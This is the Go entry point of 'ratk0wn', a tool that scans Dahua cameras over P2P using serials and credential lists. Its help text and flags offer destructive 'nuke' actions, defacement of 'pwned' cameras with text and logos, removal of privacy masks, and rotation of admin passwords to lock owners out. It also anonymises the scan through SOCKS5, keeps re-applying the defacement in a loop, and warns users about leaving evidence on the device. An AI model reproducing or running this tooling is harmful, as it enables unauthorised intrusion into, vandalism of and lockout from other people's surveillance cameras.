package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/fatih/color"
	"ratkown/ratkown/config"
	dhnet "ratkown/ratkown/net"
	"ratkown/ratkown/scan"
	"ratkown/ratkown/types"
	"ratkown/ratkown/ui"
)

const Version = "1.0.0"

var (
	colRed     = color.New(color.FgHiRed)
	colWhite   = color.New(color.FgWhite)
	colHiWhite = color.New(color.FgHiWhite)
	stdinRead  *bufio.Reader
	socks5Raw  string
)

func askYesNo(question string) bool {
	if stdinRead == nil {
		stdinRead = bufio.NewReader(os.Stdin)
	}
	for {
		fmt.Printf("%s\n  [Yes] [No] (y/n): ", question)
		line, err := stdinRead.ReadString('\n')
		if err != nil {
			return false
		}
		a := strings.ToLower(strings.TrimSpace(line))
		switch a {
		case "y", "yes", "д", "да":
			return true
		case "n", "no", "н", "нет":
			return false
		}
	}
}

type ghRelease struct {
	TagName string `json:"tag_name"`
	Assets  []struct {
		Name               string `json:"name"`
		BrowserDownloadURL string `json:"browser_download_url"`
	} `json:"assets"`
}

func httpProxyClient() *http.Client {
	if dhnet.Socks5Enabled() {
		pu := &url.URL{Scheme: "socks5", Host: socks5Raw}
		return &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(pu)}, Timeout: 6 * time.Second}
	}
	return &http.Client{Timeout: 6 * time.Second}
}

func semverGreater(a, b string) bool {
	pa := strings.Split(strings.TrimPrefix(strings.TrimPrefix(a, "v"), "V"), ".")
	pb := strings.Split(strings.TrimPrefix(strings.TrimPrefix(b, "v"), "V"), ".")
	for i := 0; i < 4; i++ {
		var na, nb int
		if i < len(pa) {
			na, _ = strconv.Atoi(pa[i])
		}
		if i < len(pb) {
			nb, _ = strconv.Atoi(pb[i])
		}
		if na > nb {
			return true
		}
		if na < nb {
			return false
		}
	}
	return false
}

func checkUpdate() {
	cli := httpProxyClient()
	resp, err := cli.Get("https://api.github.com/repos/skyaree/ratkown/releases/latest")
	if err != nil {
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return
	}
	var rel ghRelease
	if err := json.NewDecoder(resp.Body).Decode(&rel); err != nil {
		return
	}
	if rel.TagName == "" || !semverGreater(rel.TagName, Version) {
		return
	}
	quest := fmt.Sprintf("[update] do you want update ratkown? (your version: %s, updated version: %s)", Version, rel.TagName)
	if !askYesNo(quest) {
		fmt.Printf("[update] skipped, current %s running on\n", Version)
		return
	}
	for _, a := range rel.Assets {
		if a.Name == "ratk0wn.exe" {
			fmt.Printf("[update] downloading %s...\n", a.Name)
			dl, err := cli.Get(a.BrowserDownloadURL)
			if err != nil {
				fmt.Printf("[update] download failed: %v\n", err)
				return
			}
			defer dl.Body.Close()
			if dl.StatusCode != 200 {
				fmt.Printf("[update] download status %d\n", dl.StatusCode)
				return
			}
			tmp := os.Args[0] + ".new"
			f, err := os.Create(tmp)
			if err != nil {
				fmt.Printf("[update] temp file: %v\n", err)
				return
			}
			if _, err := io.Copy(f, dl.Body); err != nil {
				f.Close()
				os.Remove(tmp)
				fmt.Printf("[update] save failed: %v\n", err)
				return
			}
			f.Close()
			old := os.Args[0] + ".old"
			os.Remove(old)
			if err := os.Rename(os.Args[0], old); err != nil {
				fmt.Printf("[update] swap failed: %v (manual: replace %s)\n", err, os.Args[0])
				return
			}
			if err := os.Rename(tmp, os.Args[0]); err != nil {
				os.Rename(old, os.Args[0])
				fmt.Printf("[update] swap failed: %v\n", err)
				return
			}
			fmt.Printf("[update] updated to %s — restart ratk0wn to apply\n", rel.TagName)
			os.Exit(0)
		}
	}
	fmt.Printf("[update] no binary asset on release, pull manually:\n  git pull && go build -o ratk0wn.exe .\n")
}

var tgLinkRe = regexp.MustCompile(`(?:t\.me/|telegram\.me/|@[A-Za-z][A-Za-z0-9_]{4,31})`)

var dahuaSNRe = regexp.MustCompile(`[A-Z0-9]{14,16}`)
var dahuaPrefixRe = regexp.MustCompile(`[A-Z0-9]{10,16}`)

func isAllAlnumUpper(s string) bool {
	for _, r := range s {
		if (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') {
			continue
		}
		return false
	}
	return true
}

func looksLikeDahuaSN(s string) bool {
	if len(s) < 14 || len(s) > 16 {
		return false
	}
	if !isAllAlnumUpper(s) {
		return false
	}
	return s[6] == 'P' || s[7] == 'P' || s[8] == 'P'
}

func ExtractDahuaSNs(text string) []string {
	seen := map[string]bool{}
	var out []string
	for _, m := range dahuaSNRe.FindAllString(strings.ToUpper(text), -1) {
		if looksLikeDahuaSN(m) && !seen[m] {
			seen[m] = true
			out = append(out, m)
		}
	}
	for _, m := range dahuaPrefixRe.FindAllString(strings.ToUpper(text), -1) {
		if len(m) == 10 && (m[6] == 'P' || m[7] == 'P') && !seen[m] {
			conflict := false
			for _, sn := range out {
				if strings.HasPrefix(sn, m) {
					conflict = true
					break
				}
			}
			if !conflict {
				seen[m] = true
				out = append(out, m)
			}
		}
	}
	return out
}

func scanForTelegramIdentity(cfg *types.Config) []string {
	var found []string
	add := func(s string) {
		for _, m := range tgLinkRe.FindAllString(s, -1) {
			found = append(found, m)
		}
	}
	add(cfg.Overlay.Channel)
	for _, l := range cfg.Overlay.Custom {
		add(l)
	}
	data, err := os.ReadFile("quote.txt")
	if err == nil {
		for _, l := range strings.Split(string(data), "\n") {
			add(l)
		}
	}
	return found
}

func printHelp() {
	nowStr := time.Now().Format("15:04:05")
	colRed.Printf("[%s] ratk0wn ", nowStr)
	fmt.Printf("- %s\n", ui.RandomMOTD())
	colWhite.Printf("[?] ratk0wn — Dahua cameras scanner via P2P by skver303\n")
	fmt.Printf("[-i, --input] Input file or specific target(s)\n")
	fmt.Printf("Format:\n")
	fmt.Printf("XXXXXXXXXX > Prefix\n")
	fmt.Printf("XXXXXXXXXXYYYYY > S/N\n")
	fmt.Printf("serial:login:password > ready creds\n")
	fmt.Printf("[-o, --output] Output folder for results\n")
	fmt.Printf("Default > DD-MM-YYYY_HH-MM-SS\n")
	fmt.Printf("[-t, --threads] Number of threads for scanning\n")
	fmt.Printf("Default > 100\n")
	fmt.Printf("[-c, --config] Path to config file\n")
	fmt.Printf("Default > config.toml\n")
	fmt.Printf("[-s, --shuffle] Random targets order each run\n")
	fmt.Printf("[-n, --nuke] Use destructive options (requires [nuke] in config)\n")
	fmt.Printf("[--frame] Letterbox on every pwned cam (auto -n)\n")
	fmt.Printf("[--unmask] Strip all box masks (auto -n)\n")
	fmt.Printf("[--antiwhite] Unmask + restore video colors wrecked by nukes (auto -n)\n")
	fmt.Printf("[--forceosd] Rotate admin password per-serial: our OSD becomes unerasable for others\n")
	fmt.Printf("[--picture] Paint BMP logo watermark on every pwned cam (--picture logo.bmp) \n")
	fmt.Printf("[--socks5 host:port] Route ALL udp traffic through SOCKS5 proxy (scan anonymized)\n")
	fmt.Printf("[--web] Dashboard with live map of pwned cams (--web 7575, default port if omitted)\n")
	fmt.Printf("[--no-web] Disable web proxies and dashboard\n")
	fmt.Printf("[--osd-guard] OSD watchdog: re-apply text every N seconds (default 300). Never exits.\n")
	fmt.Printf("[-d, --debug] Log everything\n")
	fmt.Printf("[-?, -h, --help] Get general help\n")
	colHiWhite.Printf("ratk0wn by skver303 · ratk0wn · t.me/ratkointernal\n")
}

func printErrorAndExit(err string) {
	colRed.Printf("[!] %s\n", err)
	os.Exit(1)
}

func isDirReadOnly(dir string) bool {
	if _, err := os.Stat(dir); os.IsNotExist(err) {
		return false
	}
	tmpFile := filepath.Join(dir, ".p2pwn_tmp")
	f, err := os.Create(tmpFile)
	if err != nil {
		return os.IsPermission(err)
	}
	f.Close()
	os.Remove(tmpFile)
	return false
}

func looksLikeFilePath(input string) bool {
	if strings.ContainsAny(input, `/\`) {
		return true
	}
	dot := strings.LastIndex(input, ".")
	if dot <= 0 || dot == len(input)-1 {
		return false
	}
	ext := input[dot+1:]
	if len(ext) > 5 {
		return false
	}
	for _, r := range ext {
		isAlnum := (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9')
		if !isAlnum {
			return false
		}
	}
	return true
}

func main() {
	ui.InitConsole()
	checkUpdate()
	args := os.Args[1:]

	if len(args) == 0 {
		printHelp()
		return
	}

	var input string
	var output string
	threads := 100
	configPath := "config.toml"
	debugEnabled := false
	nukeEnabled := false
	showHelp := false
	shuffleEnabled := false
	frameMode := false
	unmaskMode := false
	antiwhiteMode := false
	forceosdMode := false
	socks5On := false
	webProxyMode := true
	webNoProxy := false
	webDashPort := 0
	pictureBmp := ""
	guardLoop := false
	guardInterval := 300

	for i := 0; i < len(args); i++ {
		arg := args[i]
		switch arg {
		case "-i", "--input":
			if i+1 < len(args) {
				input = args[i+1]
				i++
			}
		case "-o", "--output":
			if i+1 < len(args) {
				output = args[i+1]
				i++
			}
		case "-t", "--threads":
			if i+1 < len(args) {
				fmt.Sscanf(args[i+1], "%d", &threads)
				i++
			}
		case "-c", "--config":
			if i+1 < len(args) {
				configPath = args[i+1]
				i++
			}
		case "-d", "--debug":
			debugEnabled = true
		case "-n", "--nuke":
			nukeEnabled = true
		case "--frame":
			frameMode = true
		case "--unmask":
			unmaskMode = true
		case "--antiwhite":
			unmaskMode = true
			antiwhiteMode = true
		case "--forceosd":
			forceosdMode = true
		case "--web":
			webProxyMode = true
			if i+1 < len(args) {
				if p, perr := strconv.Atoi(args[i+1]); perr == nil && p > 0 && p < 65536 {
					webDashPort = p
					i++
				}
			}
		case "--no-web":
			webProxyMode = false
			webNoProxy = true
		case "--socks5":
			if i+1 < len(args) && !strings.HasPrefix(args[i+1], "-") {
				socks5Raw = args[i+1]
				i++
				socks5On = true
			} else {
				printErrorAndExit("--socks5 requires host:port")
			}
		case "--picture":
			if i+1 < len(args) && !strings.HasPrefix(args[i+1], "-") {
				pictureBmp = args[i+1]
				i++
			} else {
				pictureBmp = "logo.bmp"
			}
		case "-s", "--shuffle":
			shuffleEnabled = true
		case "--osd-guard":
			guardLoop = true
			if i+1 < len(args) {
				fmt.Sscanf(args[i+1], "%d", &guardInterval)
				i++
			}
		case "-h", "-?", "--help":
			showHelp = true
		}
	}

	if showHelp {
		printHelp()
		return
	}

	if input == "" {
		if _, err := os.Stat("creds_ready.txt"); err == nil {
			fmt.Println("[*] no args: checker mode -> creds_ready.txt")
			input = "creds_ready.txt"
		} else {
			printHelp()
			return
		}
	}

	var targets []string
	var provided []types.ProvidedCred
	inputSource := input
	var extractNotes []string

	addToken := func(tok string) {
		if tok == "" {
			return
		}
		if c, ok := config.ParseCredToken(tok); ok {
			provided = append(provided, c)
			targets = append(targets, c.Serial)
			return
		}
		up := strings.ToUpper(strings.TrimSpace(tok))
		sns := ExtractDahuaSNs(up)
		if len(sns) > 0 {
			for _, sn := range sns {
				targets = append(targets, sn)
			}
			snippet := up
			if len(snippet) > 64 {
				snippet = snippet[:64] + "..."
			}
			extractNotes = append(extractNotes, fmt.Sprintf("%q -> %v", snippet, sns))
			return
		}
		if len(up) == 10 && isAllAlnumUpper(up) {
			targets = append(targets, up)
			return
		}
	}

	if looksLikeFilePath(input) {
		if st, err := os.Stat(input); err != nil || st.IsDir() {
			printErrorAndExit(fmt.Sprintf("Input file not found: %s", input))
		}
	}

	if _, err := os.Stat(input); err == nil {
		content, err := os.ReadFile(input)
		if err != nil {
			printErrorAndExit(fmt.Sprintf("Cannot read input file: %s", err))
		}
		trimmed := strings.TrimSpace(string(content))
		if trimmed == "" {
			printErrorAndExit("Empty input")
		}

		for _, line := range strings.Split(trimmed, "\n") {
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}
			for _, part := range strings.Split(line, ",") {
				addToken(strings.TrimSpace(part))
			}
		}
	} else {
		for _, part := range strings.Split(input, ",") {
			addToken(strings.TrimSpace(part))
		}
	}

	if len(targets) == 0 {
		printErrorAndExit("Empty input")
	}

	seen := make(map[string]struct{}, len(targets))
	uniq := make([]string, 0, len(targets))
	for _, t := range targets {
		if _, ok := seen[t]; ok {
			continue
		}
		seen[t] = struct{}{}
		uniq = append(uniq, t)
	}
	targets = uniq

	if shuffleEnabled {
		rand.Shuffle(len(targets), func(i, j int) {
			targets[i], targets[j] = targets[j], targets[i]
		})
	}

	if output == "" {
		output = time.Now().Format("02-01-2006_15-04-05")
	}

	if isDirReadOnly(output) {
		printErrorAndExit("Output folder is read-only")
	}

	isDefaultConfig := (configPath == "config.toml")
	cfg, err := config.LoadConfig(configPath, isDefaultConfig)
	if err != nil {
		printErrorAndExit(err.Error())
	}

	if socks5On {
		if err := dhnet.Socks5Enable(socks5Raw); err != nil {
			printErrorAndExit("socks5: " + err.Error())
		}
		fmt.Printf("[socks5] > all udp traffic via %s (scan anonymized)\n", socks5Raw)
		fmt.Printf("[socks5] > direct p2p disabled, relay tunnels only\n")
	}

	if tg := scanForTelegramIdentity(cfg); len(tg) > 0 {
		colRed.Printf("[!] are you sure to put your telegram username/link on osd?\n")
		for _, m := range tg {
			fmt.Printf("    -> %s\n", m)
		}
		fmt.Printf("    osd text is physical evidence stored on the device\n")
		if !askYesNo("[!] continue with it anyway?") {
			fmt.Printf("[!] aborted, edit [overlay] in config first\n")
			return
		}
	}

	if frameMode || unmaskMode {
		nukeEnabled = true
		cfg.Nuke.Box = true
		cfg.Nuke.Delete = false
		cfg.Nuke.Disable = false
		cfg.Nuke.Video = 0
	}
	if unmaskMode {
		cfg.Nuke.BoxRects = nil
		cfg.Nuke.Reboot = false
	}
	if antiwhiteMode {
		cfg.Nuke.RestoreVideo = true
	}
	if pictureBmp != "" {
		if _, err := os.Stat(pictureBmp); err != nil {
			printErrorAndExit("Logo file not found: " + pictureBmp)
		}
		cfg.Overlay.Picture = true
		cfg.Overlay.PictureFile = pictureBmp
		fmt.Printf("[logo] > %s enabled\n", pictureBmp)
	} else if cfg.Overlay.Picture && cfg.Overlay.PictureFile != "" {
		if _, err := os.Stat(cfg.Overlay.PictureFile); err == nil {
			fmt.Printf("[logo] > %s enabled (config)\n", cfg.Overlay.PictureFile)
		} else {
			cfg.Overlay.Picture = false
			printErrorAndExit("Logo file not found (config picture_file): " + cfg.Overlay.PictureFile)
		}
	}

	if err := ui.InitDebug(output, debugEnabled); err != nil {
		printErrorAndExit(err.Error())
	}
	defer ui.CloseDebug()

	if webProxyMode && !webNoProxy && webDashPort == 0 {
		webDashPort = 7575
	}

	if webDashPort > 0 {
		if werr := scan.StartWebUI(webDashPort, output); werr != nil {
			ui.DebugLogf("web", "dashboard start failed: %v", werr)
			webDashPort = 0
		} else {
			ui.DebugLogf("web", "dashboard listening on 127.0.0.1:%d", webDashPort)
		}
	}

	for _, note := range extractNotes {
		ui.DebugLogf("extract", "found %s", note)
	}
	if len(extractNotes) > 0 {
		ui.DebugLogf("extract", "extracted %d target(s) from text", len(targets))
	}

	if cfg.Overlay.Picture {
		ui.DebugLogf("logo", "%s enabled", cfg.Overlay.PictureFile)
	} else if cfg.Overlay.PictureFile != "" {
		ui.DebugLogf("logo", "%s configured but disabled (config picture=false)", cfg.Overlay.PictureFile)
	} else {
		ui.DebugLogf("logo", "no logo file found, overlay off")
	}

	scanner := scan.NewScanner(targets, cfg, threads, output, inputSource, nukeEnabled, provided)
	scanner.UnmaskFirst = unmaskMode
	scanner.ForceosdMode = forceosdMode
	scanner.WebProxy = webProxyMode && !webNoProxy
	scanner.DashboardPort = webDashPort
	scanner.Run()

	if guardLoop {
		round := 0
		for {
			round++
			time.Sleep(time.Duration(guardInterval) * time.Second)
			nowStr := time.Now().Format("15:04:05")
			fmt.Printf("\n[%s] OSD GUARD round %d: re-applying text to %d targets...\n", nowStr, round, len(targets))
			scanner := scan.NewScanner(targets, cfg, threads, output, inputSource, nukeEnabled, provided)
			scanner.UnmaskFirst = unmaskMode
			scanner.ForceosdMode = forceosdMode
			scanner.WebProxy = webProxyMode && !webNoProxy
			scanner.DashboardPort = 0
			scanner.Run()
			fmt.Printf("[%s] OSD GUARD round %d done. next in %ds (Ctrl+C to stop)\n",
				time.Now().Format("15:04:05"), round, guardInterval)
		}
	}
}
